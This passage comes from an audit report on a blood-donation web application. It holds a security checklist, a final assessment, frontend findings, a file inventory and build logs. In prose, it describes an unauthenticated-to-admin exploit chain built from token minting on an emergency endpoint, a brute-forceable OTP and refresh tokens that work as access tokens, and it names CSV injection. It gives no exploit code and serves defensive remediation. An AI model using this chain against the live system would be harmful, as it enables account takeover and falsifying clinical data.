- [ ] **No** endpoint mutates or discloses another principal's resource without an explicit, tested authorization decision. Verified by `ResourceOwnershipIT` covering 100% of mutating endpoints.
- [ ] The `permitAll` surface is enumerated, minimal, and documented — and contains **no** token-minting endpoint.
- [ ] Refresh tokens cannot be used as access tokens; access tokens are short-lived; refresh tokens rotate with reuse detection; there is a revocation mechanism.
- [ ] OTP verification has a **durable** attempt counter, verified by a test that fails without the fix.
- [ ] Password reset works end-to-end in a production-like configuration, proven by an integration test.
- [ ] Rate limiting exists on all auth, OTP, and mutating endpoints, with documented budgets.
- [ ] No raw exception message reaches a client; every error response is from a curated, tested envelope.
- [ ] A `Content-Security-Policy` is set and enforced; no inline/third-party script is required.
- [ ] Refresh tokens are in `httpOnly; Secure; SameSite` cookies, with CSRF protection if so.
- [ ] Secrets come from a secret manager; none exist in the repository or on disk in plaintext; the app fails fast on a missing/weak secret.
- [ ] `npm audit --omit=dev` and OWASP dependency-check report zero high/critical.
- [ ] All 7 CSV exports are injection-safe and RFC-4180 quoted.

### Data
- [ ] Flyway migrations are immutable, validate cleanly on a fresh database, and are covered by an automated migration test.
- [ ] Every entity with a read-modify-write invariant (`blood_inventory`, `donations`, `donor_profiles`) has `@Version` and a concurrency test.
- [ ] Every list endpoint is paginated, filtered, and sortable in SQL — no `findAll()`-then-filter in Java on a user-facing path.
- [ ] `units_fulfilled` and inventory `expiry_date`/`reserved_units` exist, with the fulfilment cascade implemented and tested.
- [ ] A tested backup/restore procedure exists, with a documented RPO/RTO and a rehearsed restore.
- [ ] A retention policy exists for `notifications`, `audit_logs`, and `emergency_email_otps`.

### Correctness
- [ ] **No** endpoint returns a fabricated success. Every stub either works or fails loudly.
- [ ] One canonical implementation of donor eligibility, badge, and rank logic — with tests.
- [ ] All state transitions (donation, appointment, blood request, emergency) are guarded state machines with tests for every illegal transition.
- [ ] The frontend API layer is **generated** from the backend's OpenAPI document; zero hand-written mirrored interfaces; zero silent enum fallbacks.
- [ ] No hardcoded mock/default value is ever submitted to a production endpoint.
- [ ] The mock layer mirrors the **real** response shapes, so it cannot conceal contract defects.
- [ ] Every admin page functions against the real backend, verified by a smoke test per page.

### Observability
- [ ] Structured logging with correlation IDs on every request; every 5xx logged with a stack trace.
- [ ] A complete, tamper-evident audit trail for every spec-designated compliance action (logins, stock adjustments, donation completions, role changes, verification, blocks) with the **real** client IP.
- [ ] Metrics, health checks, and alerting for error rate, latency, DB pool, and the scheduled-job heartbeat.

### Quality
- [ ] No zero-byte source files, no dead classes, no orphaned manifests, assets, routes, or exports.
- [ ] `ROLES_AND_ENTITIES_WORKFLOW_MATRIX.md` matches the implementation, or unimplemented features are explicitly marked.
- [ ] No user-visible string contains encoding corruption; `.editorconfig` + root `.gitattributes` prevent recurrence.
- [ ] No component exceeds ~400 lines (currently satisfied — the largest page is 212).
- [ ] Accessibility: every interactive control has an accessible name; every form error is associated with its input; modals have dialog semantics, Escape, and focus management.

### Test coverage (minimum bar)

| Area | Minimum bar |
|---|---|
| Authorization | 100% of mutating endpoints covered by a non-owner-403 test |
| Authentication | Register, login, blocked login, refresh rotation, reuse detection, revocation, password reset end-to-end |
| OTP | Attempt durability, rate limit, expiry, resend cooldown, single-use, account resolution |
| Business rules | Eligibility, inventory transitions, donation lifecycle, appointment conflicts, compatibility matrix, match scoring, badges |
| Controllers | Every endpoint: status code, validation, authorization, error shape |
| Migrations | Clean migrate + `ddl-auto: validate` |
| API contracts | Every adapter normaliser asserted against a captured real response |
| HTTP client | 401→refresh→replay, dedup, guards, timeout, blob errors |
| AuthContext | Bootstrap, refresh-on-boot, logout, loading transitions |
| E2E | Donor availability; requester create-request → matches; hospital verify-donation → stock increments |
| Coverage | JaCoCo + coverage thresholds enforced in CI |

---

## 25. Final Conclusion

### What currently works
- **Both codebases compile.** `mvnw -o compile` and `tsc -b` both exit 0. Zero compilation errors.
- **The frontend toolchain is clean.** ESLint exits 0 with 2 cosmetic warnings; `npm run build` succeeds; `npm audit --omit=dev` reports **0 vulnerabilities**; the lockfile is fully in sync with `package.json` (433 packages, zero drift).
- **Frontend tests pass** — 9/9, though they are shallow (§14).
- **The database DDL is genuinely well-designed** for a project at this stage: 10 tables, real foreign keys with thoughtful `ON DELETE` semantics, `CHECK` constraints on quantities, a composite unique constraint on `(hospital_id, blood_group)`, and 30+ indexes including composite and partial ones.
- **The security *primitives* are sound where they exist**: BCrypt password hashing, HS256 JWTs with signature and `exp` validation, per-request re-read of `user.isActive()` (so blocking a user *does* take effect immediately), server-side HTML-free rendering with Zod, Zod validation on every form, a **medically correct** blood-compatibility matrix, `open-in-view: false`, `ddl-auto: validate` (entities and schema are checked against each other at boot), CSRF correctly disabled for a cookie-less stateless API, **no SQL injection anywhere** (100% parameterised JPA access), no command injection, no SSRF, no file upload, no committed secrets, and `.gitignore` correctly excluding every `.env`, log, and build artifact.
- **Public self-registration correctly refuses the `ADMIN` role**, and there is no role-update endpoint anywhere — that privilege-escalation vector is genuinely closed.
- **The mock layer is well engineered**: type-safe bundle isolation, honestly surfaced to users, and it made the frontend demonstrable without a backend.
- **Component architecture is good**: no page exceeds 212 lines, no component exceeds 187, and `Button`, `ErrorBoundary`, `DataTable`, `Feedback`, and the layout components are clean and correctly accessible.
- **A real specification exists** (`ROLES_AND_ENTITIES_WORKFLOW_MATRIX.md`) that enumerates roles, entities, permissions, and workflows in unusual detail. It is an excellent basis for closing the gap.

### What is broken
- **The application does not start on the developer's own database** (Flyway checksum mismatch) and **`mvn test` exits 1** because a stale 96-byte file in `target/test-classes/` shadows the real configuration — and even after `mvn clean`, the suite still cannot run because there is no embedded database.
- **Authorization is systematically absent.** Three `@PreAuthorize` annotations in a 102-file backend. Thirty-three endpoints have neither a role check nor an ownership check, including every blood-inventory write, donation creation, donation cancellation, appointment completion, hospital edit, and blood-request fulfil/cancel/edit.
- **One unauthenticated endpoint hands out valid admin tokens.** `POST /api/emergency/verify-and-dispatch` resolves the account from an attacker-supplied phone number or email and mints access + refresh tokens for it. The OTP that guards it has its **attempt counter rolled back on every failure**, so the 6-digit code is brute-forceable. This chain is a complete unauthenticated-to-admin compromise.
- **Refresh tokens are valid access tokens**, so any 7-day token is a 7-day account takeover.
- **The two headline features do not exist** — donor notification and emergency broadcast are stubs returning fabricated success messages, so the UI tells users that donors were alerted when nothing was sent.
- **Three admin pages do not function at all** against the real backend: `/admin/audit-logs` 400s on every load, and `/admin/dashboard` + `/admin/analytics` show three permanent zeros and four permanently blank charts.
- **Password reset is broken end-to-end** — a field-name mismatch on the client (`password` vs `newPassword`) *and* no email provider in any configuration.
- **Correct denials return HTTP 500** (`ForbiddenException` is unhandled), and **every 500 is discarded without a log line**.
- **Five frontend/backend enum contracts and five field-name contracts have silently diverged**, so emergencies display as "Normal", inactive users as "Active", suspended hospitals as "ACTIVE", and matched donors as "BUSY" with a fabricated distance.
- **The frontend submits fabricated data to the real backend from six sites**: a hardcoded emergency phone number, hardcoded GPS coordinates for every donor without location, fabricated hospital registration numbers (two of them), a hardcoded emergency location that becomes the persisted city, a hardcoded request city, and a fabricated landline shown to users as a hospital's real contact.
- **A clinical gate fails open**: `isEligible !== false` renders "QUALIFIED TO DONATE" when the field is `undefined`, alongside fabricated biometrics (65 kg, 25 yrs, 56 days).

### What is incomplete
Nineteen spec-mandated capabilities are absent: blood-product expiry tracking, inventory reservation, the request-fulfilment cascade, donation certificates, donor accept/decline, appointment reschedule, `NO_SHOW`, the third availability state, SMS OTP, admin hospital approval (no hospital can *ever* be verified), admin role assignment, admin notification broadcast, the compliance audit trail (three empty `@Component` files), and audit filtering by IP/actor. Forty-one further placeholders exist, including ten more source files that are zero bytes and five more classes with zero references — including an entire orphaned OTP package whose only test gives false confidence in the exact area where the P0s live.

### What is risky
Beyond the P0s: no rate limiting anywhere; raw exception messages returned to clients; CSV formula injection reachable by any hospital user against an administrator's workstation; tokens in `localStorage` with no CSP; no pagination on any endpoint; no optimistic locking on any entity; a 1.1 MB un-split JavaScript bundle; no audit trail and fabricated audit IPs; and secrets in a plaintext file on disk. The combination of "any user can rewrite blood stock" + "no audit trail" + "fake IPs in the audit log" is the most concerning triad: an actor can silently falsify clinical inventory data with zero traceability.

### What blocks production
1. `mvn test` is red (BE-001) and unfixable without a database (BE-002) — **there is no green build to gate anything on.**
2. SEC-001 + SEC-003 + SEC-002 form a working unauthenticated-to-admin exploit chain.
3. Authorization is absent on 33 endpoints, including all clinical inventory writes.
4. The backend is **not in version control** — one `git clean -fd` destroys the entire server.
5. No configuration exists in which the documented feature set functions.
6. No CI, no containers, no health checks, no monitoring, no backup plan, no README.

### What should be fixed first

**Phase 0 (today): commit the backend.** Then, in order:

1. **SEC-001** — remove token minting from the emergency dispatch endpoint.
2. **SEC-003** — make the OTP attempt counter durable; write the failing test first.
3. **SEC-004** — authorize and ownership-check all inventory writes.
4. **BE-104** — authorize and identity-bind donation creation.
5. **AUTH-001 / SEC-002** — add and enforce a `typ` claim.
6. **BE-140** — return 403 for `ForbiddenException` (one line; makes every denial observable).
7. **FE-100** — send the `action` param (one line; restores the admin audit-log page).
8. **FE-010** — fix the reset-password field name (a two-word change that unbreaks a whole flow).
9. **BE-001 / BE-002** — get `mvn clean test` green, then add CI so none of the above can regress.

### What should be tested after fixes
- **A `ResourceOwnershipIT` that asserts 403 for a non-owner on every mutating endpoint** — the single highest-value test in the project; it would have caught the P0 on day one.
- An `EmergencyEmailOtpService` test that **fails without the `REQUIRES_NEW` fix**, plus a test that a phone number belonging to an ADMIN cannot obtain tokens.
- A JWT test asserting a refresh token is rejected by the authentication filter.
- A `FlywayMigrationTest` (clean migrate + `ddl-auto: validate`).
- A concurrency test on `verifyDonation` proving inventory is incremented exactly once.
- A lifecycle test proving a `COMPLETED` donation cannot be cancelled.
- A state-machine test proving a request cannot be fulfilled beyond its units.
- Frontend contract tests asserting each of the 12 normalisers against captured real backend responses, and axios tests for the 401-refresh path (which would have caught FE-040).
- A test asserting the admin dashboard renders non-zero KPIs from a real `/analytics/overview` response.
- A Playwright pass over the three golden paths, ending with a hospital verifying a donation and observing the stock increment.
- Coverage thresholds enforced in CI, so none of the above silently decays.

---

### Closing assessment

This is a **well-structured prototype with a genuinely sound data model and clean frontend toolchain, wrapped in a security model that does not exist.** The engineering discipline visible in the parts that are done — BCrypt, real JWT signature validation, per-request account-state checks, `open-in-view: false`, `ddl-auto: validate`, real foreign keys with considered cascade rules, a medically correct blood-compatibility matrix, zero npm vulnerabilities, small well-factored components, and an honestly-labelled mock layer — suggests the author knows the fundamentals. The problem is that this discipline was applied to the *plumbing* and not to the *authorization layer*, the *contract layer*, the *configuration*, or the *delivery pipeline*.

The three highest-severity findings form a single exploit chain: an unauthenticated caller can obtain a valid administrator token (SEC-001) because the OTP guard is defeated by a transaction rollback (SEC-003), and the resulting token cannot be revoked for 7 days because refresh tokens are indistinguishable from access tokens (SEC-002). Any one of the three, fixed alone, would have blocked the chain. That they compound is the single most important thing to communicate.

Equally important, and easier to overlook: **the codebase reports success for work it has not done.** Donor alerts and emergency broadcasts return "dispatched". Donor eligibility has a guard — in a class that nothing calls. Blood expiry tracking returns an empty list. Three admin dashboards render zeros and blanks. The audit log records a fabricated IP. A licence upload shows a green chip after discarding the file. A public contact form toasts "sent" without a network call. A green test suite tests an orphan package. This pattern is more dangerous than a crashing feature, because it suppresses exactly the human escalation that a blood-donation platform requires when automation fails. **Fixing the honesty of the system's success signals should be treated as a first-class requirement, not a cleanup task.**

A second, quieter pattern deserves mention: the **mock layer is shaped to the frontend's contract rather than the backend's**, so mock mode shows four working admin charts while real mode shows four empty ones. Mock-based development without a contract test is not neutral — it actively conceals the class of defect that has broken the most pages.

With Phase 0 (commit the code) followed by Phases 1–3 (close the auth holes, then make the build green and put CI in place), the project moves from "not deployable" to "deployable with a small, well-understood user base." Phases 4–10 — the contract layer, the missing domain features, the data model gaps, performance, and the test suite — are what stand between it and being trustworthy for clinical use.

**Bottom line for a leadership decision:** the foundation is worth keeping. The gaps are systematic rather than random, which means they are tractable — six root causes account for essentially all 285 findings, and three of them (authorization, contract duplication, missing configuration) are each addressable with a focused, well-understood architectural change. But no part of this system should be exposed to real donor or patient data until Phase 1 and Phase 3 are complete.

---

**— END OF REPORT —**

**Total findings: 285** (19 P0 · 88 P1 · 139 P2 · 35 P3 · 4 informational)

---

# APPENDIX A — Page/Component/Mock/Test Layer Findings

This appendix contains the findings produced by a dedicated scan of `src/pages`, `src/components`, `src/mocks`, and `src/__tests__` — the surface that the main API-layer review could not see. Findings are cross-referenced to the main report where they overlap.

## A.0 Scope metrics

| Directory | Files | Lines |
|---|---:|---:|
| `src/pages/requester` | 8 | 1,060 |
| `src/pages/donor` | 8 | 1,103 |
| `src/pages/hospital` | 7 | 1,017 |
| `src/pages/admin` | 10 | 1,459 |
| `src/pages/public` | 3 | 375 |
| `src/pages/auth` | 1 | 165 |
| **`src/pages` total** | **37** | **5,179** |
| `src/components/*` (9 subfolders) | 23 | 1,370 |
| `src/mocks` | 3 | 1,265 |
| `src/types/models.ts` | 1 | 470 |
| `src/index.css` | 1 | 50 |
| `src/__tests__` | 5 | 354 |
| **Grand total** | **70** | **8,688** |

**Files over ~400 lines: only 3**, all outside pages/components — `src/mocks/index.ts` (817), `src/types/models.ts` (470), `src/mocks/data.ts` (418). Largest page is `AdminUsersPage.tsx` (212); largest component is `Fields.tsx` (187). **No page or component exceeds 400 lines.**

**Text-encoding corruption inside `src/pages` and `src/components`: none.** A repo-wide grep for `U+FFFD`, `Ã©`, `â€™`, `â€œ`, `dY??` returned zero matches in that surface. The corruption is confined to `constants/blood.ts`, `utils/format.ts`, and `DonorContributionService.java` (FE-060/061/062).

## A.1 Severity summary

| Sev | Count | Highest-impact items |
|---|---:|---|
| **P0** | 3 | Admin audit-log page 400s on every load (FE-100); 3/6 admin KPI cards always 0 and 4/4 admin charts always empty (FE-101); all of `AdminAnalyticsPage` (FE-102) |
| **P1** | 20 | Fabricated registration number, coordinates, city, phone and location submitted to the real backend; eligibility failing open; `Hospital.status` always ACTIVE; `MatchResult`/`Inventory`/`AnalyticsOverview`/`AuditLog`/`User` field-name mismatches; hospital donations not scoped; `<button><Link>` on the 404 page; mock token self-inconsistency; real-backend credentials in the test suite |
| **P2** | 34 | Dead filters wired to nothing; permanently single-page pagination; un-normalised `hospitalApi.bloodRequests`; unlabelled availability toggle; fabricated biometrics and "lives saved"; missing `aria-label`s on 9 selects; 4 mutations with no error handling; non-functional report/date filters; placeholder upload + fake-success contact form; missing error states on ~10 pages |
| **P3** | 14 | 22 dead exports; duplicate filter/pagination layers; 2 orphaned routes; 4× duplicated notifications page; unguarded `new Date()` (with correct helpers sitting unused); `NaN%` milestone bar; inconsistent `role="alert"` |

## A.2 Two systemic root causes (confirmed by the page scan)

1. **Normalisation is applied inconsistently.** `bloodRequestApi`, `emergencyApi`, `appointmentApi`, `inventoryApi`, `donationApi`, `contributionApi`, `notificationApi` all normalise. `adminApi`, `analyticsApi`, `matchingApi`, `userApi`, and `hospitalApi.bloodRequests` do **not**. Every field-mismatch bug (FE-101, FE-107, FE-108, FE-109, FE-110, FE-111) lives in the second group.
2. **The frontend's pagination/filter model assumes Spring `Page` responses, but 12 of 14 backend list endpoints return bare `List<T>`.** That single architectural gap produces FE-123, FE-124, FE-125, FE-041 (admin reports), FE-048, and makes ~10 tables silently truncate.

## A.3 Clean files (verified — recorded for balance)

| File | Assessment |
|---|---|
| `src/index.css` | Clean. Valid Tailwind v4 `@theme`/`@custom-variant`; all custom properties defined and consumed; global `:focus-visible` outline. No mojibake |
| `src/pages/public/HomePage.tsx` | Clean. Correct `key` usage (L43, L123, L146); honest mock-data labelling (L133-139); no fabricated data |
| `src/components/common/Button.tsx` | Clean. `disabled={disabled \|\| loading}` (L48) correctly prevents double submission; spinner is `aria-hidden`; `type` defaults to `"button"` |
| `src/components/common/ErrorBoundary.tsx` | Clean. Correct `getDerivedStateFromError` + `componentDidCatch` + resettable fallback |
| `src/components/common/PageHeader.tsx`, `Card.tsx`, `StatCard.tsx`, `PageSpinner.tsx`, `ApproximateMap.tsx`, `MockBanner.tsx`, `Logo.tsx`, `PublicLayout.tsx`, `AuthLayout.tsx` | All clean. Proper keys, no hardcoded data, no a11y defects |
| `src/components/layout/DashboardLayout.tsx` | Correct `key={item.to}` (L23); `aria-label` on all icon buttons (L60, L78, L85, L106, L110); `MockBanner` mounted; unread badge driven by a real query. Only issue is the orphan-route problem (FE-139) |
| `src/components/layout/PublicChrome.tsx` | Correct keys, `aria-label` on all icon buttons, both SOS entry points wired. Clean |
| `src/components/tables/DataTable.tsx` | Correct `key={row.id}` / `key={column.key}` (L82, L90, L92); proper loading→error→empty→data precedence; `role="tablist"`/`role="tab"`/`aria-selected` on `Tabs` (L120-131). Only issue: `error`/`onRetry` are never supplied (FE-128) |
| `src/components/common/Feedback.tsx` | Clean. `role="status"` on `Alert`, `role="alert"` on errors, `aria-hidden` on decorative icons. (`NetworkError` is unused) |
| `src/components/common/Badge.tsx` | Clean component. The problem is upstream: it is fed enum values the backend never sends (FE-011/013/014/015) |
| `src/pages/auth/AuthPages.tsx` `LoginPage` (L45-73) | Clean. `isSubmitting` wired to `loading`, root error displayed with `role="alert"`, no mock data |
| `src/pages/public/ErrorPages.tsx` `ForbiddenPage` (L17-33) | Clean. (`NotFoundPage` is the exception — FE-117) |
| `src/mocks/helpers.ts` | Clean. `mockFail` builds a correct `ApiError`; `paginate` and `id` are correct |
| `src/types/models.ts` | Structurally clean (well-organised, consistent `string` dates, generic `PageResponse<T>`). Its defects are **semantic**: the imported enum unions and field names that don't match backend DTOs |

---

# APPENDIX B — Complete File Inventory

## B.1 Backend — 102 Java files

### `com/redpulse/` (1)
`RedPulseApplication.java` — `@SpringBootApplication`, `@EnableScheduling`, hand-rolled `.env` loader

### `com/redpulse/common/` (24)

**audit/** (3, ALL EMPTY): `AuditAspect.java`, `AuditEventPublisher.java`, `LoggableAction.java`
**dto/** (3, ALL EMPTY): `ApiResponse.java`, `ErrorDetail.java`, `PageResponse.java`
**exception/** (8): `BaseException.java` *(EMPTY)*, `BadRequestException.java`, `ConflictException.java`, `ForbiddenException.java`, `GlobalExceptionHandler.java`, `InsufficientStockException.java`, `ResourceNotFoundException.java`, `UnauthorizedException.java`
**firebase/** (2): `FirebaseAdminConfig.java` *(FULLY COMMENTED OUT)*, `FirebaseTokenService.java`
**notification/** (6): `DevelopmentEmailService.java`, `DevelopmentSmsService.java` *(unused)*, `EmailService.java`, `SmsService.java` *(unused)*, `UnconfiguredProductionEmailService.java`, `UnconfiguredProductionSmsService.java` *(unused)*
**otp/** (4, ALL ORPHANED): `InMemoryOtpStore.java`, `OtpRecord.java`, `OtpStore.java`, `SharedOtpStore.java`
**phone/** (1): `IndianPhoneNumber.java`
**security/** (6): `CustomUserDetailsService.java`, `JwtAuthenticationFilter.java`, `JwtService.java` *(EMPTY)*, `JwtUtils.java`, `SecurityUtils.java`, `UserPrincipal.java`
**utils/** (2): `DateTimeUtils.java` *(EMPTY)*, `LocationUtils.java`

### `com/redpulse/config/` (9)
`ApplicationConfig.java`, `AsyncConfig.java` *(EMPTY)*, `CorsConfig.java`, `DataInitializer.java`, `MailConfig.java`, `OpenApiConfig.java` *(EMPTY)*, `SecurityConfig.java`, `SwaggerAutoOpen.java`

### `com/redpulse/enums/` (13)
`AppointmentStatus.java`, `AvailabilityStatus.java`, `BloodGroup.java`, `BloodRequestStatus.java`, `DonationStatus.java`, `EmergencyStatus.java`, `InventoryStockStatus.java` *(EMPTY)*, `NotificationType.java`, `Role.java`, `Urgency.java`, `UserStatus.java`, `VerificationStatus.java` *(EMPTY)*

### `com/redpulse/modules/admin/` (6)
`controller/AdminController.java`, `controller/AdminUserController.java`, `dto/AdminDashboardResponse.java`, `dto/AuditLogResponse.java`, `entity/AuditLog.java`, `repository/AuditLogRepository.java`, `service/AdminService.java`

### `com/redpulse/modules/appointment/` (7)
`controller/AppointmentController.java`, `dto/AppointmentCreateRequest.java`, `dto/AppointmentResponse.java`, `dto/AppointmentUpdateRequest.java` *(unused)*, `entity/Appointment.java`, `repository/AppointmentRepository.java`, `service/AppointmentReminderService.java`, `service/AppointmentService.java`

### `com/redpulse/modules/auth/` (11)
`controller/AuthController.java`, `controller/FirebasePhoneAuthController.java`, `dto/AuthResponse.java`, `dto/FirebasePhoneAuthRequest.java`, `dto/ForgotPasswordRequest.java`, `dto/LoginRequest.java`, `dto/RefreshTokenRequest.java`, `dto/RegisterRequest.java`, `dto/ResetPasswordRequest.java`, `Entity/Role.java` *(duplicate enum, unused)*, `service/AuthService.java`, `service/FirebasePhoneAuthService.java`

### `com/redpulse/modules/donation/` (6)
`controller/DonationController.java`, `dto/DonationCreateRequest.java`, `dto/DonationResponse.java`, `entity/Donation.java`, `repository/DonationRepository.java`, `service/DonationService.java`

### `com/redpulse/modules/hospital/` (6)
`controller/HospitalController.java`, `dto/HospitalRequest.java`, `dto/HospitalResponse.java`, `entity/Hospital.java`, `repository/HospitalRepository.java`, `service/HospitalService.java`

### `com/redpulse/modules/inventory/` (7)
`controller/InventoryController.java`, `dto/InventoryRequest.java`, `dto/InventoryResponse.java`, `dto/StockUpdateRequest.java`, `entity/BloodInventory.java`, `repository/BloodInventoryRepository.java`, `service/InventoryService.java`

### `com/redpulse/modules/matching/` (4)
`controller/MatchingController.java`, `dto/DonorMatchResponse.java`, `dto/LocationUpdateRequest.java`, `service/MatchingService.java`

### `com/redpulse/modules/notification/` (5)
`controller/NotificationController.java`, `dto/NotificationResponse.java`, `entity/Notification.java`, `repository/NotificationRepository.java`, `service/NotificationService.java`

### `com/redpulse/modules/request/` (19)
`controller/BloodRequestController.java`, `controller/EmergencyOtpController.java`, `controller/EmergencyRequestController.java`
`dto/` (9): `BloodRequestCreateRequest.java`, `BloodRequestResponse.java`, `EmergencyEmailOtpRequest.java`, `EmergencyEmailOtpVerifyRequest.java`, `EmergencyOtpDispatchPayload.java`, `EmergencyOtpRequest.java` *(unused)*, `EmergencyRequestCreateRequest.java`, `EmergencyRequestResponse.java`
`entity/` (4): `BloodRequest.java`, `EmergencyEmailOtp.java`, `EmergencyRequest.java`, `EmergencyVerification.java`
`repository/` (4): `BloodRequestRepository.java`, `EmergencyEmailOtpRepository.java`, `EmergencyRequestRepository.java`, `EmergencyVerificationRepository.java`
`service/` (3): `BloodRequestService.java`, `EmergencyEmailOtpService.java`, `EmergencyRequestService.java`

### `com/redpulse/modules/user/` (13)
`controller/DonorContributionController.java`, `controller/UserController.java`
`dto/` (8): `AvailabilityUpdateRequest.java`, `DonorContributionResponse.java`, `DonorEligibilityResponse.java`, `DonorLeaderboardResponse.java`, `DonorProfileRequest.java`, `DonorProfileResponse.java`, `UpdateUserRequest.java`, `UserResponse.java`
`entity/` (2): `DonorProfile.java`, `User.java`
`repository/` (2): `DonorProfileRepository.java`, `UserRepository.java`
`service/` (3): `DonorContributionService.java`, `UserProfileService.java`, `UserService.java` *(DEAD)*

### Backend resources
`application.yml`, `application-dev.yml` *(EMPTY)*, `application-prod.yml` *(EMPTY)*
`db/migration/`: `V1__create_users_tables.sql`, `V2__create_hospitals_and_inventory.sql`, `V3__create_blood_requests_and_emergencies.sql`, `V4__create_appointments_and_donations.sql`, `V5__create_notifications_and_audit_logs.sql`, `V6__add_indexes_and_constraints.sql` *(EMPTY)*, `V7__add_firebase_uid_to_users.sql`, `V8__create_emergency_email_verification.sql`, `V9__complete_appointment_lifecycle.sql`

### Backend tests (4 files / 7 tests)
`RedPulseApplicationTests.java` *(FAILS)*, `common/otp/InMemoryOtpStoreTest.java` *(tests dead code)*, `common/phone/IndianPhoneNumberTest.java`, `modules/auth/service/AuthServiceValidationTest.java`

---

## B.2 Frontend — 70 source files

### Root config (11)
`.env` *(ignored)*, `.env.example`, `.gitignore`, `eslint.config.js`, `index.html`, `package.json`, `package-lock.json`, `tailwind.config.ts`, `tsconfig.json`, `tsconfig.app.json`, `tsconfig.node.json`, `vite.config.ts`, `vitest.config.ts`

### `src/` root (6)
`App.tsx`, `main.tsx`, `index.css`, `vite-env.d.ts`, `test/setup.ts`, `assets/` *(3 unused: hero.png, typescript.svg, vite.svg)*

### `src/api/` (18)
`adminApi.ts`, `analyticsApi.ts`, `appointmentApi.ts`, `authApi.ts`, `axios.ts`, `bloodRequestApi.ts`, `contracts.ts`, `contributionApi.ts`, `donationApi.ts`, `donorApi.ts`, `emergencyApi.ts`, `errors.ts`, `hospitalApi.ts`, `httpHelpers.ts`, `index.ts`, `inventoryApi.ts`, `locationApi.ts`, `matchingApi.ts`, `notificationApi.ts`, `real.ts`, `reportApi.ts`, `typed.ts`, `userApi.ts`

### `src/context/` (4)
`AuthContext.tsx`, `authUtils.ts`, `ThemeContext.tsx`, `useTheme.ts`

### `src/routes/` (3)
`AppRoutes.tsx`, `ProtectedRoute.tsx`, `RoleRoute.tsx`

### `src/pages/` (37)

**admin/** (10, 1,459 lines): `AdminAnalyticsPage.tsx`, `AdminAuditLogsPage.tsx`, `AdminDashboardPage.tsx`, `AdminDonationsPage.tsx`, `AdminDonorsPage.tsx`, `AdminHospitalsPage.tsx`, `AdminNotificationsPage.tsx`, `AdminReportsPage.tsx`, `AdminRequestsPage.tsx`, `AdminUsersPage.tsx`
**auth/** (1, 165 lines): `AuthPages.tsx` — exports `LoginPage`, `RegisterPage`, `ForgotPasswordPage`, `ResetPasswordPage`
**donor/** (8, 1,103 lines): `DonorAppointmentsPage.tsx`, `DonorContributionsPage.tsx`, `DonorDashboardPage.tsx`, `DonorDonationsPage.tsx`, `DonorNotificationsPage.tsx`, `DonorProfilePage.tsx`, `DonorRequestDetailPage.tsx`, `DonorRequestsPage.tsx`
**hospital/** (7, 1,017 lines): `HospitalAppointmentsPage.tsx`, `HospitalDashboardPage.tsx`, `HospitalDonationsPage.tsx`, `HospitalInventoryPage.tsx`, `HospitalNotificationsPage.tsx`, `HospitalProfilePage.tsx`, `HospitalRequestsPage.tsx`
**public/** (3, 375 lines): `ContentPages.tsx` — exports `AboutPage`, `HowItWorksPage`, `BecomeDonorPage`, `FindBloodPage`, `HospitalsPage`, `ContactPage`; `ErrorPages.tsx` — exports `NotFoundPage`, `ForbiddenPage`; `HomePage.tsx`
**requester/** (8, 1,060 lines): `CreateBloodRequestPage.tsx`, `FindDonorsPage.tsx`, `RequesterDashboardPage.tsx`, `RequesterEmergencyDetailPage.tsx`, `RequesterEmergencyPage.tsx`, `RequesterNotificationsPage.tsx`, `RequesterRequestDetailPage.tsx`, `RequesterRequestsPage.tsx`

### `src/components/` (23, 1,370 lines)
**cards/** (2): `Card.tsx`, `StatCard.tsx`
**charts/** (1): `ChartCard.tsx`
**common/** (8): `ApproximateMap.tsx`, `Badge.tsx`, `Button.tsx`, `ErrorBoundary.tsx`, `Feedback.tsx`, `MockBanner.tsx`, `PageHeader.tsx`
**emergency/** (1): `EmergencyQuickSosModal.tsx`
**forms/** (1): `Fields.tsx`
**layout/** (5): `AuthLayout.tsx`, `DashboardLayout.tsx`, `Logo.tsx`, `PublicChrome.tsx`, `PublicLayout.tsx`
**loading/** (1): `PageSpinner.tsx`
**modals/** (4): `AppointmentModal.tsx`, `ConfirmDialog.tsx`, `Dialog.tsx`, `InventoryModal.tsx`
**tables/** (1): `DataTable.tsx`

### `src/constants/` (5)
`blood.ts`, `env.ts`, `nav.ts`, `queryKeys.ts`, `storage.ts`

### `src/hooks/` (1)
`useListParams.ts` *(dead)*

### `src/mocks/` (3, 1,265 lines)
`data.ts` (418), `helpers.ts`, `index.ts` (817)

### `src/schemas/` (1)
`index.ts`

### `src/types/` (2)
`enums.ts`, `index.ts`, `models.ts` (470)

### `src/utils/` (4)
`cn.ts`, `debounce.ts` *(dead)*, `download.ts`, `format.ts` *(3 of 4 functions dead)*, `searchParams.ts`

### `src/__tests__/` (5, 354 lines)
`auth.test.tsx` (3 smoke assertions), `bloodRequest.test.tsx` (2 Zod assertions, no React), `inventory.test.tsx` (2 Zod assertions, no React), `routes.test.tsx` (3 smoke assertions), `frontend.integration.test.ts` (7 blocks against `http://localhost:8080` — **excluded from `npm test`**)

---

# APPENDIX C — Raw Command Output

## C.1 `mvnw -o test` (FAILED — exit 1)

```
[INFO] Tests run: 1, Failures: 0, Errors: 0 -- in com.redpulse.common.otp.InMemoryOtpStoreTest
[INFO] Tests run: 2, Failures: 0, Errors: 0 -- in com.redpulse.common.phone.IndianPhoneNumberTest
Mockito is currently self-attaching to enable the inline-mock-maker. This will no longer work in
future releases of the JDK.
[INFO] Tests run: 3, Failures: 0, Errors: 0 -- in com.redpulse.modules.auth.service.AuthServiceValidationTest
[INFO] Running com.redpulse.RedPulseApplicationTests
WARN --- Exception encountered during context initialization - cancelling refresh attempt:
org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'entityManagerFactory'
  ... Failed to initialize dependency 'flyway' ...
  ... Error creating bean with name 'dataSource' ...:
      com.zaxxer.hikari.HikariDataSource: Factory method 'dataSource' threw exception with message:
      Failed to determine a suitable driver class
[INFO] BUILD FAILURE
exit=1
```

**Root cause (BE-001):** `target/test-classes/application.yml` is a stale 96-byte file:

```yaml
spring:
  config:
    import: optional:file:.env[.properties]

firebase:
  enabled: false
```

It shadows the real 2,038-byte `application.yml` on the Surefire classpath, so the test context loads **no `spring.datasource`, no `jwt.*`, no `app.*`**. Setting `DB_URL`/`DB_PASSWORD` as environment variables did **not** help, because the keys are absent from the loaded configuration entirely.

## C.2 `npm run build` (PASSED — with a size warning)

```
> red-pulse@1.0.0 build
> tsc -b && vite build

vite v7.3.6 building client environment for production...
✓ 2572 modules transformed.
rendering chunks...
computing gzip size...
dist/index.html                   1.00 kB │ gzip:   0.51 kB
